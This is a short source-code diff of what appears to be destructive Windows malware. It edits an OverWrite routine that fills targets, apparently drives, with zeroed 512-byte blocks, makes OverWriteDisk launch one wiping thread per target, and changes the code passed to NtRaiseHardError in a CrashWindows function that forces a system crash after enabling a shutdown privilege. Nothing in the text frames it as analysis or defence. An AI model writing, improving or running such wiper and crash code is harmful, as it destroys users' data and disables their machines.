@@ -198,7 +198,7 @@ void OverWrite(LPCWSTR Name) {
     unsigned char* EmptyData = (unsigned char*)LocalAlloc(LMEM_ZEROINIT, 512);
     DWORD dwUnused;
     SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
-    for (int i = 0; i < 500000; i++) {
+    for (int i = 0; i < 50000; i++) {
         WriteFile(hFile, EmptyData, 512, &dwUnused, NULL);
     }
     CloseHandle(hFile);
@@ -206,7 +206,8 @@ void OverWrite(LPCWSTR Name) {
 
 void OverWriteDisk() {
     for (int i = 0; i < nOverwrite; i++) {
-        OverWrite(overwrite[i]);
+        CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(OverWrite), (PVOID)overwrite[i], 0, NULL);
+        Sleep(10);
     }
 }
 
@@ -220,7 +221,7 @@ void CrashWindows() {
 
     if (RtlAdjustPrivilege && NtRaiseHardError) {
         RtlAdjustPrivilege(0x13, true, false, &unused1);
-        NtRaiseHardError(0xdead6666, 0, 0, 0, 6, &unused2);
+        NtRaiseHardError(0xdeaddead, 0, 0, 0, 6, &unused2);
     }
 
     FreeLibrary(hNtdll);
